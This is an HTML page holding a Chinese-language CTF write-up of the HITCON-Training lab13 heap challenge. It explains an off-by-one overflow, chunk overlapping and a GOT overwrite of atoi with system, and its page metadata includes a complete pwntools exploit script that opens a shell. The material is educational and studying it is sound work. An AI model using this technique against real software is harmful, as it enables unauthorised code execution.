@@ -1,0 +1,619 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>overlapping例题-HITCON_Training_lab13 | CAI dog</title>
+<meta name="keywords" content="">
+<meta name="description" content="overlapping例题-HITCON_Training_lab13 写在前面
+题目：HITCON-Training/LAB/lab13 at master · scwuaptx/HITCON-Training · GitHub
+虽然overlapping这个技术逻辑上不复杂，但这道题的利用还是挺麻烦的。
+不过这道题也算是独立做出来的第一道题，从发现漏洞点，到成功利用都没有看其他的资料。
+程序逻辑 首先我们了解一下程序创建heap的基本逻辑：
+我们可以将上面的流程简化为：
+可以看到，如果要创建一个heap，则会创建两个chunk。
+这是heap逻辑上的结构，而在内存中，如果我们创建两个heap，所有的chunk的排列方式位：
+漏洞逻辑 漏洞点在edit_heap()函数，按理来说cread_heap函数也有，但这里我们详细说edit_heap函数。
+可以看到这里的read_input函数的第二个函数，将heap的content大小传入其中，并在函数中采用read函数读取content大小的字符串：
+问题在于传入read函数的size大小，是content的大小，但read函数是从0开始计算的。
+也就是如果传入的是26，那么read函数会读取27个字节。
+这样就发生了off_by_one漏洞。
+又因为上面堆的结构，我们可以通过off_by_one覆盖chunk的size，从而实现overlapping：
+这时我们再free掉heap2的两个chunk，这时堆的结构就会变成：
+漏洞利用 上面说到了这个漏洞可以使用overlapping，那么我们需要考虑，overlapping之后，我们需要控制什么呢？很明显我们需要控制heap_manage中content_chunk指针。
+首先我们先创建三个heap，那么程序就会创建六个chunk，在堆中的分布如下：
+create(&#39;24&#39;, &#39;a&#39;*24)create(&#39;16&#39;, &#39;b&#39;*16)create(&#39;16&#39;, &#39;c&#39;*16) 这时我们通过heap1的content覆盖掉heap2_manage_chunk的size：
+overflow = b&#39;a&#39;*24 &#43; b&#39;\x81&#39;edit(&#39;0&#39;, overflow) 这时我们再free掉heap1和heap2。
+delete(&#39;0&#39;)delete(&#39;1&#39;) 注意这里需要先free掉heap1，再free掉heap2，原因是先让heap1进入fastbins。
+这时，fastbin的结构如下：
+这时我们需要先申请一个heap，来消耗掉fastbin的0x20链表中的前两个chunk。
+然后再申请一个chunk为0x80大小的content。这样就可以控制heap3的heap3_manage_chunk。
+**注意：**这里一定要先申请一个heap，否则在覆盖heap3_manage_chunk时，会破坏heap2_manage_chunk的结构。
+这里我们创建heap2时就输入content，覆盖掉heap3_manage_chunk中user_data的低八字节。
+create(&#39;16&#39;, &#39;d&#39;*16)payload = b&#39;a&#39;*0x40 &#43; p64(16) &#43; p64(0x602060)create(&#39;112&#39;, payload) 此时堆的结构如下：
+**注意：**带颜色的部分是原本的堆结构，新的结构是白字所示
+可以看到此时，如果我们编辑heap2的content，就会破坏heap1_manage_chunk，但是因为heap1没什么用，破坏就破坏掉吧。
+这里我们修改，让其指向atoi函数的got表，然后show(heap3)，就可以将atoi的地址打印出来，这样就可以获得基地址，计算出system函数地址。
+show(&#39;2&#39;)p.recvuntil(&#39;Content : &#39;)atoi = u64(p.">
+<meta name="author" content="shangdi4sb">
+<link rel="canonical" href="https://jellyfish-pro.github.io/ctf/overlapping%E4%BE%8B%E9%A2%98-hitcon_training_lab13/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css" integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe&#43;FVUFzPh7U=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://jellyfish-pro.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jellyfish-pro.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jellyfish-pro.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jellyfish-pro.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jellyfish-pro.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="overlapping例题-HITCON_Training_lab13" />
+<meta property="og:description" content="overlapping例题-HITCON_Training_lab13 写在前面
+题目：HITCON-Training/LAB/lab13 at master · scwuaptx/HITCON-Training · GitHub
+虽然overlapping这个技术逻辑上不复杂，但这道题的利用还是挺麻烦的。
+不过这道题也算是独立做出来的第一道题，从发现漏洞点，到成功利用都没有看其他的资料。
+程序逻辑 首先我们了解一下程序创建heap的基本逻辑：
+我们可以将上面的流程简化为：
+可以看到，如果要创建一个heap，则会创建两个chunk。
+这是heap逻辑上的结构，而在内存中，如果我们创建两个heap，所有的chunk的排列方式位：
+漏洞逻辑 漏洞点在edit_heap()函数，按理来说cread_heap函数也有，但这里我们详细说edit_heap函数。
+可以看到这里的read_input函数的第二个函数，将heap的content大小传入其中，并在函数中采用read函数读取content大小的字符串：
+问题在于传入read函数的size大小，是content的大小，但read函数是从0开始计算的。
+也就是如果传入的是26，那么read函数会读取27个字节。
+这样就发生了off_by_one漏洞。
+又因为上面堆的结构，我们可以通过off_by_one覆盖chunk的size，从而实现overlapping：
+这时我们再free掉heap2的两个chunk，这时堆的结构就会变成：
+漏洞利用 上面说到了这个漏洞可以使用overlapping，那么我们需要考虑，overlapping之后，我们需要控制什么呢？很明显我们需要控制heap_manage中content_chunk指针。
+首先我们先创建三个heap，那么程序就会创建六个chunk，在堆中的分布如下：
+create(&#39;24&#39;, &#39;a&#39;*24)create(&#39;16&#39;, &#39;b&#39;*16)create(&#39;16&#39;, &#39;c&#39;*16) 这时我们通过heap1的content覆盖掉heap2_manage_chunk的size：
+overflow = b&#39;a&#39;*24 &#43; b&#39;\x81&#39;edit(&#39;0&#39;, overflow) 这时我们再free掉heap1和heap2。
+delete(&#39;0&#39;)delete(&#39;1&#39;) 注意这里需要先free掉heap1，再free掉heap2，原因是先让heap1进入fastbins。
+这时，fastbin的结构如下：
+这时我们需要先申请一个heap，来消耗掉fastbin的0x20链表中的前两个chunk。
+然后再申请一个chunk为0x80大小的content。这样就可以控制heap3的heap3_manage_chunk。
+**注意：**这里一定要先申请一个heap，否则在覆盖heap3_manage_chunk时，会破坏heap2_manage_chunk的结构。
+这里我们创建heap2时就输入content，覆盖掉heap3_manage_chunk中user_data的低八字节。
+create(&#39;16&#39;, &#39;d&#39;*16)payload = b&#39;a&#39;*0x40 &#43; p64(16) &#43; p64(0x602060)create(&#39;112&#39;, payload) 此时堆的结构如下：
+**注意：**带颜色的部分是原本的堆结构，新的结构是白字所示
+可以看到此时，如果我们编辑heap2的content，就会破坏heap1_manage_chunk，但是因为heap1没什么用，破坏就破坏掉吧。
+这里我们修改，让其指向atoi函数的got表，然后show(heap3)，就可以将atoi的地址打印出来，这样就可以获得基地址，计算出system函数地址。
+show(&#39;2&#39;)p.recvuntil(&#39;Content : &#39;)atoi = u64(p." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://jellyfish-pro.github.io/ctf/overlapping%E4%BE%8B%E9%A2%98-hitcon_training_lab13/" /><meta property="article:section" content="ctf" />
+
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="overlapping例题-HITCON_Training_lab13"/>
+<meta name="twitter:description" content="overlapping例题-HITCON_Training_lab13 写在前面
+题目：HITCON-Training/LAB/lab13 at master · scwuaptx/HITCON-Training · GitHub
+虽然overlapping这个技术逻辑上不复杂，但这道题的利用还是挺麻烦的。
+不过这道题也算是独立做出来的第一道题，从发现漏洞点，到成功利用都没有看其他的资料。
+程序逻辑 首先我们了解一下程序创建heap的基本逻辑：
+我们可以将上面的流程简化为：
+可以看到，如果要创建一个heap，则会创建两个chunk。
+这是heap逻辑上的结构，而在内存中，如果我们创建两个heap，所有的chunk的排列方式位：
+漏洞逻辑 漏洞点在edit_heap()函数，按理来说cread_heap函数也有，但这里我们详细说edit_heap函数。
+可以看到这里的read_input函数的第二个函数，将heap的content大小传入其中，并在函数中采用read函数读取content大小的字符串：
+问题在于传入read函数的size大小，是content的大小，但read函数是从0开始计算的。
+也就是如果传入的是26，那么read函数会读取27个字节。
+这样就发生了off_by_one漏洞。
+又因为上面堆的结构，我们可以通过off_by_one覆盖chunk的size，从而实现overlapping：
+这时我们再free掉heap2的两个chunk，这时堆的结构就会变成：
+漏洞利用 上面说到了这个漏洞可以使用overlapping，那么我们需要考虑，overlapping之后，我们需要控制什么呢？很明显我们需要控制heap_manage中content_chunk指针。
+首先我们先创建三个heap，那么程序就会创建六个chunk，在堆中的分布如下：
+create(&#39;24&#39;, &#39;a&#39;*24)create(&#39;16&#39;, &#39;b&#39;*16)create(&#39;16&#39;, &#39;c&#39;*16) 这时我们通过heap1的content覆盖掉heap2_manage_chunk的size：
+overflow = b&#39;a&#39;*24 &#43; b&#39;\x81&#39;edit(&#39;0&#39;, overflow) 这时我们再free掉heap1和heap2。
+delete(&#39;0&#39;)delete(&#39;1&#39;) 注意这里需要先free掉heap1，再free掉heap2，原因是先让heap1进入fastbins。
+这时，fastbin的结构如下：
+这时我们需要先申请一个heap，来消耗掉fastbin的0x20链表中的前两个chunk。
+然后再申请一个chunk为0x80大小的content。这样就可以控制heap3的heap3_manage_chunk。
+**注意：**这里一定要先申请一个heap，否则在覆盖heap3_manage_chunk时，会破坏heap2_manage_chunk的结构。
+这里我们创建heap2时就输入content，覆盖掉heap3_manage_chunk中user_data的低八字节。
+create(&#39;16&#39;, &#39;d&#39;*16)payload = b&#39;a&#39;*0x40 &#43; p64(16) &#43; p64(0x602060)create(&#39;112&#39;, payload) 此时堆的结构如下：
+**注意：**带颜色的部分是原本的堆结构，新的结构是白字所示
+可以看到此时，如果我们编辑heap2的content，就会破坏heap1_manage_chunk，但是因为heap1没什么用，破坏就破坏掉吧。
+这里我们修改，让其指向atoi函数的got表，然后show(heap3)，就可以将atoi的地址打印出来，这样就可以获得基地址，计算出system函数地址。
+show(&#39;2&#39;)p.recvuntil(&#39;Content : &#39;)atoi = u64(p."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "ctf",
+      "item": "https://jellyfish-pro.github.io/ctf/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "overlapping例题-HITCON_Training_lab13",
+      "item": "https://jellyfish-pro.github.io/ctf/overlapping%E4%BE%8B%E9%A2%98-hitcon_training_lab13/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "overlapping例题-HITCON_Training_lab13",
+  "name": "overlapping例题-HITCON_Training_lab13",
+  "description": "overlapping例题-HITCON_Training_lab13 写在前面\n题目：HITCON-Training/LAB/lab13 at master · scwuaptx/HITCON-Training · GitHub\n虽然overlapping这个技术逻辑上不复杂，但这道题的利用还是挺麻烦的。\n不过这道题也算是独立做出来的第一道题，从发现漏洞点，到成功利用都没有看其他的资料。\n程序逻辑 首先我们了解一下程序创建heap的基本逻辑：\n我们可以将上面的流程简化为：\n可以看到，如果要创建一个heap，则会创建两个chunk。\n这是heap逻辑上的结构，而在内存中，如果我们创建两个heap，所有的chunk的排列方式位：\n漏洞逻辑 漏洞点在edit_heap()函数，按理来说cread_heap函数也有，但这里我们详细说edit_heap函数。\n可以看到这里的read_input函数的第二个函数，将heap的content大小传入其中，并在函数中采用read函数读取content大小的字符串：\n问题在于传入read函数的size大小，是content的大小，但read函数是从0开始计算的。\n也就是如果传入的是26，那么read函数会读取27个字节。\n这样就发生了off_by_one漏洞。\n又因为上面堆的结构，我们可以通过off_by_one覆盖chunk的size，从而实现overlapping：\n这时我们再free掉heap2的两个chunk，这时堆的结构就会变成：\n漏洞利用 上面说到了这个漏洞可以使用overlapping，那么我们需要考虑，overlapping之后，我们需要控制什么呢？很明显我们需要控制heap_manage中content_chunk指针。\n首先我们先创建三个heap，那么程序就会创建六个chunk，在堆中的分布如下：\ncreate(\u0026#39;24\u0026#39;, \u0026#39;a\u0026#39;*24)\rcreate(\u0026#39;16\u0026#39;, \u0026#39;b\u0026#39;*16)\rcreate(\u0026#39;16\u0026#39;, \u0026#39;c\u0026#39;*16) 这时我们通过heap1的content覆盖掉heap2_manage_chunk的size：\noverflow = b\u0026#39;a\u0026#39;*24 + b\u0026#39;\\x81\u0026#39;\redit(\u0026#39;0\u0026#39;, overflow) 这时我们再free掉heap1和heap2。\ndelete(\u0026#39;0\u0026#39;)\rdelete(\u0026#39;1\u0026#39;) 注意这里需要先free掉heap1，再free掉heap2，原因是先让heap1进入fastbins。\n这时，fastbin的结构如下：\n这时我们需要先申请一个heap，来消耗掉fastbin的0x20链表中的前两个chunk。\n然后再申请一个chunk为0x80大小的content。这样就可以控制heap3的heap3_manage_chunk。\n**注意：**这里一定要先申请一个heap，否则在覆盖heap3_manage_chunk时，会破坏heap2_manage_chunk的结构。\n这里我们创建heap2时就输入content，覆盖掉heap3_manage_chunk中user_data的低八字节。\ncreate(\u0026#39;16\u0026#39;, \u0026#39;d\u0026#39;*16)\rpayload = b\u0026#39;a\u0026#39;*0x40 + p64(16) + p64(0x602060)\rcreate(\u0026#39;112\u0026#39;, payload) 此时堆的结构如下：\n**注意：**带颜色的部分是原本的堆结构，新的结构是白字所示\n可以看到此时，如果我们编辑heap2的content，就会破坏heap1_manage_chunk，但是因为heap1没什么用，破坏就破坏掉吧。\n这里我们修改，让其指向atoi函数的got表，然后show(heap3)，就可以将atoi的地址打印出来，这样就可以获得基地址，计算出system函数地址。\nshow(\u0026#39;2\u0026#39;)\rp.recvuntil(\u0026#39;Content : \u0026#39;)\ratoi = u64(p.",
+  "keywords": [
+    
+  ],
+  "articleBody": "overlapping例题-HITCON_Training_lab13 写在前面\n题目：HITCON-Training/LAB/lab13 at master · scwuaptx/HITCON-Training · GitHub\n虽然overlapping这个技术逻辑上不复杂，但这道题的利用还是挺麻烦的。\n不过这道题也算是独立做出来的第一道题，从发现漏洞点，到成功利用都没有看其他的资料。\n程序逻辑 首先我们了解一下程序创建heap的基本逻辑：\n我们可以将上面的流程简化为：\n可以看到，如果要创建一个heap，则会创建两个chunk。\n这是heap逻辑上的结构，而在内存中，如果我们创建两个heap，所有的chunk的排列方式位：\n漏洞逻辑 漏洞点在edit_heap()函数，按理来说cread_heap函数也有，但这里我们详细说edit_heap函数。\n可以看到这里的read_input函数的第二个函数，将heap的content大小传入其中，并在函数中采用read函数读取content大小的字符串：\n问题在于传入read函数的size大小，是content的大小，但read函数是从0开始计算的。\n也就是如果传入的是26，那么read函数会读取27个字节。\n这样就发生了off_by_one漏洞。\n又因为上面堆的结构，我们可以通过off_by_one覆盖chunk的size，从而实现overlapping：\n这时我们再free掉heap2的两个chunk，这时堆的结构就会变成：\n漏洞利用 上面说到了这个漏洞可以使用overlapping，那么我们需要考虑，overlapping之后，我们需要控制什么呢？很明显我们需要控制heap_manage中content_chunk指针。\n首先我们先创建三个heap，那么程序就会创建六个chunk，在堆中的分布如下：\ncreate('24', 'a'*24)\rcreate('16', 'b'*16)\rcreate('16', 'c'*16) 这时我们通过heap1的content覆盖掉heap2_manage_chunk的size：\noverflow = b'a'*24 + b'\\x81'\redit('0', overflow) 这时我们再free掉heap1和heap2。\ndelete('0')\rdelete('1') 注意这里需要先free掉heap1，再free掉heap2，原因是先让heap1进入fastbins。\n这时，fastbin的结构如下：\n这时我们需要先申请一个heap，来消耗掉fastbin的0x20链表中的前两个chunk。\n然后再申请一个chunk为0x80大小的content。这样就可以控制heap3的heap3_manage_chunk。\n**注意：**这里一定要先申请一个heap，否则在覆盖heap3_manage_chunk时，会破坏heap2_manage_chunk的结构。\n这里我们创建heap2时就输入content，覆盖掉heap3_manage_chunk中user_data的低八字节。\ncreate('16', 'd'*16)\rpayload = b'a'*0x40 + p64(16) + p64(0x602060)\rcreate('112', payload) 此时堆的结构如下：\n**注意：**带颜色的部分是原本的堆结构，新的结构是白字所示\n可以看到此时，如果我们编辑heap2的content，就会破坏heap1_manage_chunk，但是因为heap1没什么用，破坏就破坏掉吧。\n这里我们修改，让其指向atoi函数的got表，然后show(heap3)，就可以将atoi的地址打印出来，这样就可以获得基地址，计算出system函数地址。\nshow('2')\rp.recvuntil('Content : ')\ratoi = u64(p.recvuntil('Done !', drop=True)[:-1].ljust(8, b'\\x00'))\rprint('[+] atoi = ' + hex(atoi))\ratoi_libc = 0x36e90\rsystem = 0x453a0\rbase = atoi - atoi_libc\rsystem_addr = base + system 随后我们edit(heap3)，因为这时已经heap3的content指针指向了atoi函数的got表，我们修改heap3的content，其实就是修改atoi函数的地址。\n修改成为我们的system函数地址，这样程序调用atoi函数就可以进入system函数。\nedit('2', p64(system_addr))\rp.send('sh')\rp.interactive() #!/usr/bin/python3\rfrom pwn import *\rcontext.log_level = 'debug'\rp = process('./heapcreator')\rdef create(size, content):\rp.recvuntil('Your choice :')\rp.sendline('1')\rp.recvuntil('Size of Heap : ')\rp.send(size)\rp.recvuntil('Content of heap:')\rp.send(content)\rdef edit(index, content):\rp.recvuntil('Your choice :')\rp.sendline('2')\rp.recvuntil('Index :')\rp.send(index)\rp.recvuntil('Content of heap : ')\rp.send(content)\rdef show(index):\rp.recvuntil('Your choice :')\rp.sendline('3')\rp.recvuntil('Index :')\rp.send(index)\rdef delete(index):\rp.recvuntil('Your choice :')\rp.sendline('4')\rp.recvuntil('Index :')\rp.send(index)\rcreate('24', 'a'*24)\rcreate('16', 'b'*16)\rcreate('16', 'c'*16)\roverflow = b'a'*24 + b'\\x81'\redit('0', overflow)\rdelete('0')\rdelete('1')\rcreate('16', 'd'*16)\rpayload = b'a'*0x40 + p64(16) + p64(0x602060)\rcreate('112', payload)\rshow('2')\rp.recvuntil('Content : ')\ratoi = u64(p.recvuntil('Done !', drop=True)[:-1].ljust(8, b'\\x00'))\rprint('[+] atoi = ' + hex(atoi))\ratoi_libc = 0x36e90\rsystem = 0x453a0\rbase = atoi - atoi_libc\rsystem_addr = base + system\r# gdb.attach(p, 'b*0x400B2B')\r# pause()\redit('2', p64(system_addr))\rp.send('cat ./flag')\rp.interactive() ",
+  "wordCount" : "233",
+  "inLanguage": "en",
+  "datePublished": "0001-01-01T00:00:00Z",
+  "dateModified": "0001-01-01T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "shangdi4sb"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://jellyfish-pro.github.io/ctf/overlapping%E4%BE%8B%E9%A2%98-hitcon_training_lab13/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "CAI dog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://jellyfish-pro.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jellyfish-pro.github.io" accesskey="h" title="CAI dog (Alt + H)">CAI dog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://jellyfish-pro.github.io/search" title="search (Alt &#43; /)" accesskey=/>
+                    <span>search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/" title="home">
+                    <span>home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/posts" title="posts">
+                    <span>posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/note" title="note">
+                    <span>note</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/ctf" title="ctf">
+                    <span>ctf</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/study" title="study">
+                    <span>study</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://jellyfish-pro.github.io">Home</a>&nbsp;»&nbsp;<a href="https://jellyfish-pro.github.io/ctf/">ctf</a></div>
+    <h1 class="post-title">
+      overlapping例题-HITCON_Training_lab13
+    </h1>
+    <div class="post-meta">2 min&nbsp;·&nbsp;shangdi4sb
+
+</div>
+  </header> <div class="toc">
+    <details  open>
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#overlapping%e4%be%8b%e9%a2%98-hitcon_training_lab13" aria-label="overlapping例题-HITCON_Training_lab13">overlapping例题-HITCON_Training_lab13</a><ul>
+                        
+                <li>
+                    <a href="#%e7%a8%8b%e5%ba%8f%e9%80%bb%e8%be%91" aria-label="程序逻辑">程序逻辑</a></li>
+                <li>
+                    <a href="#%e6%bc%8f%e6%b4%9e%e9%80%bb%e8%be%91" aria-label="漏洞逻辑">漏洞逻辑</a></li>
+                <li>
+                    <a href="#%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8" aria-label="漏洞利用">漏洞利用</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="overlapping例题-hitcon_training_lab13">overlapping例题-HITCON_Training_lab13<a hidden class="anchor" aria-hidden="true" href="#overlapping例题-hitcon_training_lab13">#</a></h2>
+<p><strong>写在前面</strong></p>
+<p>题目：<a href="https://github.com/scwuaptx/HITCON-Training/tree/master/LAB/lab13">HITCON-Training/LAB/lab13 at master · scwuaptx/HITCON-Training · GitHub</a></p>
+<p>虽然overlapping这个技术逻辑上不复杂，但这道题的利用还是挺麻烦的。</p>
+<p>不过这道题也算是独立做出来的第一道题，从发现漏洞点，到成功利用都没有看其他的资料。</p>
+<h3 id="程序逻辑">程序逻辑<a hidden class="anchor" aria-hidden="true" href="#程序逻辑">#</a></h3>
+<p>首先我们了解一下程序创建heap的基本逻辑：</p>
+<p><img loading="lazy" src="/ctf/overlapping-HITCON_Training_lab13.assets/image-20231122112852972.png" alt="image-20231122112852972"  />
+</p>
+<p>我们可以将上面的流程简化为：</p>
+<p><img loading="lazy" src="/ctf/overlapping-HITCON_Training_lab13.assets/image-20231122114505219.png" alt="image-20231122114505219"  />
+</p>
+<p>可以看到，如果要创建一个heap，则会创建两个chunk。</p>
+<p>这是heap逻辑上的结构，而在内存中，如果我们创建两个heap，所有的chunk的排列方式位：</p>
+<p><img loading="lazy" src="/ctf/overlapping-HITCON_Training_lab13.assets/image-20231122115804548.png" alt="image-20231122115804548"  />
+</p>
+<h3 id="漏洞逻辑">漏洞逻辑<a hidden class="anchor" aria-hidden="true" href="#漏洞逻辑">#</a></h3>
+<p>漏洞点在edit_heap()函数，按理来说cread_heap函数也有，但这里我们详细说edit_heap函数。</p>
+<p><img loading="lazy" src="/ctf/overlapping-HITCON_Training_lab13.assets/image-20231122133728739.png" alt="image-20231122133728739"  />
+</p>
+<p>可以看到这里的read_input函数的第二个函数，将heap的content大小传入其中，并在函数中采用read函数读取content大小的字符串：</p>
+<p><img loading="lazy" src="/ctf/overlapping-HITCON_Training_lab13.assets/image-20231122140629761.png" alt="image-20231122140629761"  />
+</p>
+<p>问题在于传入read函数的size大小，是content的大小，但read函数是从0开始计算的。</p>
+<p>也就是如果传入的是26，那么read函数会读取27个字节。</p>
+<p>这样就发生了off_by_one漏洞。</p>
+<p>又因为上面堆的结构，我们可以通过off_by_one覆盖chunk的size，从而实现overlapping：</p>
+<p><img loading="lazy" src="/ctf/overlapping-HITCON_Training_lab13.assets/image-20231122142401666.png" alt="image-20231122142401666"  />
+</p>
+<p>这时我们再free掉heap2的两个chunk，这时堆的结构就会变成：</p>
+<p><img loading="lazy" src="/ctf/overlapping-HITCON_Training_lab13.assets/image-20231122143155098.png" alt="image-20231122143155098"  />
+</p>
+<h3 id="漏洞利用">漏洞利用<a hidden class="anchor" aria-hidden="true" href="#漏洞利用">#</a></h3>
+<p>上面说到了这个漏洞可以使用overlapping，那么我们需要考虑，overlapping之后，我们需要控制什么呢？很明显我们需要控制heap_manage中content_chunk指针。</p>
+<p>首先我们先创建三个heap，那么程序就会创建六个chunk，在堆中的分布如下：</p>
+<pre tabindex="0"><code>create(&#39;24&#39;, &#39;a&#39;*24)
+create(&#39;16&#39;, &#39;b&#39;*16)
+create(&#39;16&#39;, &#39;c&#39;*16)
+</code></pre><p><img loading="lazy" src="/ctf/overlapping-HITCON_Training_lab13.assets/image-20231122152902057.png" alt="image-20231122152902057"  />
+</p>
+<p>这时我们通过heap1的content覆盖掉heap2_manage_chunk的size：</p>
+<pre tabindex="0"><code>overflow = b&#39;a&#39;*24 + b&#39;\x81&#39;
+edit(&#39;0&#39;, overflow)
+</code></pre><p><img loading="lazy" src="/ctf/overlapping-HITCON_Training_lab13.assets/image-20231122153330993.png" alt="image-20231122153330993"  />
+</p>
+<p>这时我们再free掉heap1和heap2。</p>
+<pre tabindex="0"><code>delete(&#39;0&#39;)
+delete(&#39;1&#39;)
+</code></pre><p>注意这里需要先free掉heap1，再free掉heap2，原因是先让heap1进入fastbins。</p>
+<p><img loading="lazy" src="/ctf/overlapping-HITCON_Training_lab13.assets/image-20231122153922312.png" alt="image-20231122153922312"  />
+</p>
+<p>这时，fastbin的结构如下：</p>
+<p><img loading="lazy" src="/ctf/overlapping-HITCON_Training_lab13.assets/image-20231122155041995.png" alt="image-20231122155041995"  />
+</p>
+<p>这时我们需要先申请一个heap，来消耗掉fastbin的0x20链表中的前两个chunk。</p>
+<p>然后再申请一个chunk为0x80大小的content。这样就可以控制heap3的heap3_manage_chunk。</p>
+<p>**注意：**这里一定要先申请一个heap，否则在覆盖heap3_manage_chunk时，会破坏heap2_manage_chunk的结构。</p>
+<p>这里我们创建heap2时就输入content，覆盖掉heap3_manage_chunk中user_data的低八字节。</p>
+<pre tabindex="0"><code>create(&#39;16&#39;, &#39;d&#39;*16)
+payload = b&#39;a&#39;*0x40 + p64(16) + p64(0x602060)
+create(&#39;112&#39;, payload)
+</code></pre><p>此时堆的结构如下：</p>
+<p><img loading="lazy" src="/ctf/overlapping-HITCON_Training_lab13.assets/image-20231122164536947.png" alt="image-20231122164536947"  />
+</p>
+<p>**注意：**带颜色的部分是原本的堆结构，新的结构是白字所示</p>
+<p>可以看到此时，如果我们编辑heap2的content，就会破坏heap1_manage_chunk，但是因为heap1没什么用，破坏就破坏掉吧。</p>
+<p>这里我们修改，让其指向atoi函数的got表，然后show(heap3)，就可以将atoi的地址打印出来，这样就可以获得基地址，计算出system函数地址。</p>
+<pre tabindex="0"><code>show(&#39;2&#39;)
+p.recvuntil(&#39;Content : &#39;)
+atoi = u64(p.recvuntil(&#39;Done !&#39;, drop=True)[:-1].ljust(8, b&#39;\x00&#39;))
+print(&#39;[+] atoi = &#39; + hex(atoi))
+
+atoi_libc = 0x36e90
+system = 0x453a0
+base = atoi - atoi_libc
+system_addr = base + system
+</code></pre><p>随后我们edit(heap3)，因为这时已经heap3的content指针指向了atoi函数的got表，我们修改heap3的content，其实就是修改atoi函数的地址。</p>
+<p>修改成为我们的system函数地址，这样程序调用atoi函数就可以进入system函数。</p>
